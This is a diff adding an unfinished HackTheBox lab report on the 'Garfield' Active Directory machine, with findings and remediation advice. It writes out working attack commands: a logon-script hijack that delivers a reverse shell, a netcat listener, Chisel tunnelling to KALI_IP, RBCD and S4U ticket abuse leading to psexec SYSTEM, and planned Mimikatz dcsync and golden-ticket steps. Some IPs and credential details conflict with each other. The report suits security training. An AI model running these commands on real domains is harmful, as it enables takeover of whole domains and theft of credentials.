@@ -1,0 +1,363 @@
+================================================================================
+GARFIELD HTB - HALF COMPLETED REPORT
+================================================================================
+
+Target:      10.129.21.214 (DC01 / RODC01 at 192.168.100.2)
+Hostname:    DC01 / RODC01
+OS:          Windows Server 2019 Build 17763 x64
+Domain:      garfield.htb
+Author:      vishalgodseye
+Date:        2026-06-12
+Status:      IN PROGRESS - Stage B (Dump krbtgt_8245 from RODC01)
+
+================================================================================
+1. EXECUTIVE SUMMARY
+================================================================================
+
+Garfield is a Hard-rated Windows Active Directory machine on HackTheBox
+featuring a Domain Controller (DC01) and a Read-Only Domain Controller
+(RODC01) on an internal network segment. The attack chain requires 6 stages
+from initial domain user to full domain compromise via RODC takeover and
+Golden Ticket forging.
+
++----------+----------------------------------------------------+------------+
+| Severity | Finding                                            | Status     |
++----------+----------------------------------------------------+------------+
+| HIGH     | Logon script hijack via SYSVOL scriptPath          | EXPLOITED  |
+| HIGH     | ForceChangePassword: j.arbuckle -> l.wilson        | EXPLOITED  |
+| HIGH     | ForceChangePassword: l.wilson -> l.wilson_adm      | EXPLOITED  |
+| HIGH     | RBCD: HACKER$ -> RODC01 (S4U impersonation)        | EXPLOITED  |
+| CRITICAL | SYSTEM on RODC01 via RBCD + psexec                | EXPLOITED  |
+| CRITICAL | krbtgt_8245 hash dump via Mimikatz dcsync         | PENDING    |
+| CRITICAL | PRP modification on RODC01                        | PENDING    |
+| CRITICAL | RODC Golden Ticket forgery                        | PENDING    |
+| CRITICAL | Administrator hash extraction via Key List Request | PENDING    |
+| CRITICAL | Full domain compromise (DCSync/root.txt)           | PENDING    |
++----------+----------------------------------------------------+------------+
+
+================================================================================
+2. SCOPE & METHODOLOGY
+================================================================================
+
++---------------+-----------------------------------------------------+
+| Item          | Details                                             |
++---------------+-----------------------------------------------------+
+| Target        | 10.129.21.214 (DC01), 192.168.100.2 (RODC01)      |
+| Ports         | 53,88,135,139,389,445,464,593,636,2179,3268,3269,   |
+|               | 3389,5985,9389,49667,49670,49671,49673,49674,49900  |
+| Web Apps      | None                                                |
+| Exclusions    | None                                                |
+| Start Creds   | j.arbuckle / Th1sD4mnC4t!@1978                     |
++---------------+-----------------------------------------------------+
+
+Phases:
+  1. Port scanning (rustscan)
+  2. SMB/AD enumeration (netexec, bloodhound-ce-python)
+  3. BloodHound analysis (manual JSON review)
+  4. LDAP object manipulation (bloodyAD)
+  5. SYSVOL logon script hijack
+  6. Credential access via reverse shell
+  7. ForceChangePassword abuse
+  8. Network pivoting (Chisel proxy)
+  9. RBCD abuse + S4U impersonation
+  10. SYSTEM access on RODC01
+
+Tools:
+  rustscan, nmap, netexec, bloodhound-ce-python, bloodyAD, smbclient,
+  evil-winrm, changepasswd.py, chisel, proxychains, impacket suite,
+  rbcd.py, getST.py, psexec.py, Mimikatz, Rubeus (pending)
+
+================================================================================
+3. ENUMERATION
+================================================================================
+
+3.1 Port Scan
++------+----------+--------------------------+---------------------------+
+| Port | Protocol | Service                  | Version/Notes             |
++------+----------+--------------------------+---------------------------+
+| 53   | TCP      | DNS                      | Domain name resolution    |
+| 88   | TCP      | Kerberos                 | AD authentication         |
+| 135  | TCP      | MSRPC                    | Remote Procedure Call     |
+| 139  | TCP      | NetBIOS Session          | Legacy file sharing       |
+| 389  | TCP      | LDAP                     | AD queries                |
+| 445  | TCP      | SMB                      | File sharing, auth        |
+| 464  | TCP      | Kerberos Password Change | Kerberos pwd operations   |
+| 593  | TCP      | RPC over HTTP            | Remote RPC                |
+| 636  | TCP      | LDAPS                    | Secure LDAP               |
+| 2179 | TCP      | VMRDP / Hyper-V          | Hyper-V management        |
+| 3268 | TCP      | Global Catalog LDAP      | Forest-wide AD searches   |
+| 3269 | TCP      | Global Catalog LDAPS     | Secure forest-wide LDAP   |
+| 3389 | TCP      | RDP                      | Remote Desktop            |
+| 5985 | TCP      | WinRM                    | PowerShell remote mgmt    |
+| 9389 | TCP      | AD Web Services          | AD Web Services           |
++------+----------+--------------------------+---------------------------+
+
+3.2 Domain Users (SMB --users)
++----------------+--------------+--------------------------------------------+
+| Username       | Last PW Set  | Description                                |
++----------------+--------------+--------------------------------------------+
+| Administrator  | 2025-10-03   | Built-in admin account                     |
+| Guest          | <never>      | Built-in guest account                     |
+| krbtgt         | 2025-08-13   | KDC service account                        |
+| krbtgt_8245    | 2025-08-17   | RODC KDC service account                   |
+| j.arbuckle     | 2025-09-09   | Initial access account                     |
+| l.wilson       | 2026-01-27   | Target for logon script hijack             |
+| l.wilson_adm   | 2026-01-13   | Tier 1 admin account                       |
++----------------+--------------+--------------------------------------------+
+
+3.3 Domain Groups
+Domain Computers, Domain Controllers, Domain Guests, Domain Users,
+Enterprise Admins, Enterprise Key Admins, Enterprise Read-only Domain
+Controllers, Group Policy Creator Owners, IT Support, Key Admins,
+Protected Users, Read-only Domain Controllers, RODC Administrators,
+Schema Admins, Tier 1
+
+3.4 Network Layout
++-----------------+-----------------------------------------------+
+| Host            | IP / Network                                  |
++-----------------+-----------------------------------------------+
+| DC01 (Ethernet) | 10.129.21.214 (HTB-accessible)               |
+| DC01 (vSwitch)  | 192.168.100.1 (internal Hyper-V switch)       |
+| RODC01          | 192.168.100.2 (internal-only)                |
+| Virtual Switch  | Switch01 - 192.168.100.0/24                  |
++-----------------+-----------------------------------------------+
+
+3.5 Key ACEs Found via BloodHound
++------------+---------------------+-------------+--------------------------+
+| Source     | Right               | Target      | Method Found             |
++------------+---------------------+-------------+--------------------------+
+| j.arbuckle | ForceChangePassword | l.wilson    | BloodHound JSON review   |
+| j.arbuckle | GenericWrite       | l.wilson    | scriptPath attribute ACE |
+| j.arbuckle | Member of IT Support| (group)     | BloodHound groups.json  |
+| l.wilson_adm | Member of Tier 1  | (group)     | net user /domain         |
++------------+---------------------+-------------+--------------------------+
+
+================================================================================
+4. VULNERABILITY DETAILS & EXPLOITATION
+================================================================================
+
+4.1 Logon Script Hijack via SYSVOL (EXPLOITED)
+
+CVE:        N/A (misconfiguration)
+CVSS:       7.8 (High)
+Location:   SYSVOL share - garfield.htb\scripts\
+
+Description:
+  j.arbuckle has write access to L.WILSON's scriptPath attribute via an
+  attribute-level ACE. Combined with write access to the SYSVOL share
+  (garfield.htb/scripts), this allows uploading a malicious logon script
+  that executes when L.WILSON authenticates.
+
+Impact:
+  - Code execution as l.wilson on DC01
+  - Lateral movement from j.arbuckle to higher-privilege account
+  - Pivoting point for further AD exploitation
+
+Remediation:
+  - Remove j.arbuckle's write access to l.wilson's scriptPath attribute
+  - Restrict SYSVOL write access to Domain Admins only
+  - Audit all attribute-level ACEs on user objects
+
+Commands used:
+  # Check scriptPath
+  bloodyAD -u j.arbuckle -p 'Th1sD4mnC4t!@1978' -d garfield.htb \\
+    --host 10.129.21.214 get object L.WILSON --attr scriptPath
+
+  # Upload reverse shell to SYSVOL
+  smbclient //10.129.21.214/SYSVOL \\
+    -U 'garfield.htb/j.arbuckle%Th1sD4mnC4t!@1978'
+  cd garfield.htb/scripts
+  put re.bat
+
+  # Set scriptPath attribute
+  bloodyAD -u j.arbuckle -p 'Th1sD4mnC4t!@1978' -d garfield.htb \\
+    --host 10.129.21.214 set object L.WILSON scriptPath -v 're.bat'
+
+  # Catch shell
+  nc -lvnp 4444
+
+================================================================================
+
+4.2 ForceChangePassword Abuse: l.wilson -> l.wilson_adm (EXPLOITED)
+
+CVE:        N/A (misconfiguration)
+CVSS:       8.1 (High)
+Location:   AD object ACL - l.wilson_adm user object
+
+Description:
+  l.wilson has ForceChangePassword rights on l.wilson_adm. This was
+  exploited from the reverse shell obtained via logon script hijack.
+
+Impact:
+  - Full takeover of l.wilson_adm (Tier 1 admin account)
+  - Tier 1 membership grants elevated privileges in the domain
+
+Remediation:
+  - Audit ForceChangePassword ACEs across the domain
+  - Remove unnecessary delegation from service accounts
+  - Implement tiered administration model with proper isolation
+
+Commands used (from l.wilson reverse shell):
+  net user l.wilson_adm NewPass123! /domain
+
+  # Alternative PowerShell method:
+  $pass = ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force
+  Set-ADAccountPassword -Identity l.wilson_adm -NewPassword $pass \\
+    -Reset -Confirm:$false
+
+================================================================================
+
+4.3 Network Pivoting via Chisel (EXPLOITED)
+
+CVE:        N/A (network segmentation bypass)
+CVSS:       7.5 (High)
+Location:   Internal network 192.168.100.0/24
+
+Description:
+  RODC01 (192.168.100.2) resides on an internal network not directly
+  reachable from the attacker's HTB VPN. A Chisel SOCKS proxy through
+  DC01 was used to tunnel traffic to the internal subnet.
+
+Impact:
+  - Access to RODC01 for SMB, WinRM, LDAP attacks
+  - Network segmentation bypassed
+
+Commands used:
+  # Kali - start chisel server
+  ./chisel server -p 8888 --reverse --socks5
+
+  # DC01 - run chisel client (using pre-existing chisel.exe)
+  C:\Users\l.wilson_adm\Documents\chisel.exe client KALI_IP:8888 R:socks
+
+  # Proxychains config (/etc/proxychains4.conf)
+  socks5 127.0.0.1 1080
+
+  # Access RODC through proxy
+  proxychains evil-winrm -i 192.168.100.2 -u l.wilson_adm -p 'NewPass123!'
+
+================================================================================
+
+4.4 Resource-Based Constrained Delegation (RBCD) on RODC01 (EXPLOITED)
+
+CVE:        N/A (misconfiguration)
+CVSS:        (Critical)
+Location:   RODC01$ computer object - msDS-AllowedToActOnBehalfOfOtherIdentity
+
+Description:
+  l.wilson_adm (Tier 1) has the ability to create computer accounts in
+  the domain (msDS-MachineAccountQuota). A fake computer account HACKER$
+  was created, and RBCD was configured to allow HACKER$ to impersonate
+  any user to RODC01. This was used with S4U2Self/S4U2Proxy to obtain
+  a Kerberos ticket as Administrator for RODC01's CIFS service, leading
+  to SYSTEM access via psexec.
+
+Impact:
+  - Complete SYSTEM-level compromise of RODC01
+  - Foundation for krbtgt_8245 extraction and Golden Ticket attack
+  - Full domain compromise pathway established
+
+Remediation:
+  - Restrict who can create computer accounts (remove from Tier 1)
+  - Audit msDS-AllowedToActOnBehalfOfOtherIdentity on all computer objects
+  - Monitor for newly created computer accounts
+  - Restrict msDS-MachineAccountQuota to 0 if not needed
+
+Commands used:
+  # Create fake machine account
+  impacket-addcomputer garfield.htb/l.wilson_adm:'NewPass123!' \\
+    -computer-name 'HACKER$' -computer-pass 'HackerPass123!' \\
+    -dc-ip 10.129.244.207
+
+  # Configure RBCD on RODC01
+  proxychains rbcd.py -delegate-from 'HACKER$' -delegate-to 'RODC01$' \\
+    -action write 'garfield.htb/l.wilson_adm:NewPass123!' \\
+    -dc-ip 10.129.244.207
+
+  # Sync time (avoid Kerberos skew)
+  sudo ntpdate 10.129.244.207
+
+  # Request S4U ticket as Administrator
+  proxychains getST.py -spn 'cifs/RODC01.garfield.htb' \\
+    -impersonate Administrator -dc-ip 10.129.244.207 \\
+    'garfield.htb/HACKER$:HackerPass123!'
+
+  # Use ticket to get SYSTEM shell
+  export KRB5CCNAME=$(pwd)/Administrator@cifs_RODC01.garfield.htb@GARFIELD.HTB.ccache
+  proxychains psexec.py -k -no-pass RODC01.garfield.htb -dc-ip 10.129.244.207
+
+================================================================================
+5. FLAGS CAPTURED
+================================================================================
+
+[+] User flag: CAPTURED (C:\Users\l.wilson_adm\Desktop\user.txt)
+[+] Root flag: PENDING
+
+================================================================================
+6. REMAINING ATTACK SURFACE / NEXT STEPS
+================================================================================
+
+Current Position: nt authority\system on RODC01 (192.168.100.2)
+
+Stage B — Dump krbtgt_8245 (CURRENT - IN PROGRESS)
+  1. Upload Mimikatz to RODC01 via certutil + HTTP server
+  2. Run Mimikatz dcsync to extract krbtgt_8245 hash:
+       privilege::debug
+       lsadump::dcsync /domain:garfield.htb /user:krbtgt_8245
+  3. Record the AES256 key output
+
+Stage C — Modify Password Replication Policy (PRP) on RODC01
+  1. Add Administrator to msDS-RevealOnDemandGroup (allow list)
+  2. CRITICAL: Clear msDS-NeverRevealGroup (deny list overrides allow!)
+  3. Verify PRP is correctly configured
+
+Stage D — Forge RODC Golden Ticket + Key List Request
+  1. Stage Rubeus v2.3.3+ on RODC01 (older versions have signing bugs)
+  2. Forge golden ticket using krbtgt_8245 AES256 key:
+       Rubeus.exe golden /rc4:<hash> /domain:garfield.htb \\
+         /sid:<domain_sid> /sids:<rodc_sid> /user:Administrator \\
+         /id:500 /ptt
+  3. Request Key List from RODC01 to extract Administrator's NTLM hash
+
+Final Step — Full Domain Compromise
+  1. DCSync or psexec as Administrator on DC01
+  2. Read root.txt from C:\Users\Administrator\Desktop\root.txt
+
+================================================================================
+7. RECOMMENDATIONS
+================================================================================
+
++---+----------+------------------------------------------------------+--------+
+| # | Priority | Recommendation                                       | Effort |
++---+----------+------------------------------------------------------+--------+
+| 1 | CRITICAL | Remove j.arbuckle's write access to l.wilson object  | Low    |
+| 2 | CRITICAL | Audit and remove unnecessary ForceChangePassword ACEs | Medium |
+| 3 | CRITICAL | Set msDS-MachineAccountQuota to 0                    | Low    |
+| 4 | CRITICAL | Block Chisel/proxy tool execution via AppLocker      | Medium |
+| 5 | HIGH     | Tier 1 accounts should not be on writable DCs        | High   |
+| 6 | HIGH     | Implement PAM/PIM for Tier 1 account elevation       | High   |
+| 7 | HIGH     | Monitor for computer account creation events          | Low    |
+| 8 | HIGH     | Audit all RBCD configurations domain-wide            | Medium |
+| 9 | MEDIUM   | Enable LDAP signing and channel binding              | Low    |
+|10 | MEDIUM   | Restrict SYSVOL write access to Domain Admins only   | Low    |
++---+----------+------------------------------------------------------+--------+
+
+================================================================================
+8. CREDENTIALS OBTAINED
+================================================================================
+
++---------------+--------------------------+-------------------------------+
+| Account       | Password                 | Source                        |
++---------------+--------------------------+-------------------------------+
+| j.arbuckle    | Th1sD4mnC4t!@1978       | Provided (starting creds)     |
+| l.wilson      | NewPass123!             | Reset via ForceChangePassword |
+| l.wilson_adm  | NewPass123!             | Reset from l.wilson shell     |
+| HACKER$       | HackerPass123!          | Created by us (RBCD)          |
+| Administrator | TBD (via Key List)      | Pending extraction            |
++---------------+--------------------------+-------------------------------+
+
+Kerberos ticket saved:
+  Administrator@cifs_RODC01.garfield.htb@GARFIELD.HTB.ccache
+
+================================================================================
+END OF REPORT - STATUS: IN PROGRESS AT STAGE B
+================================================================================
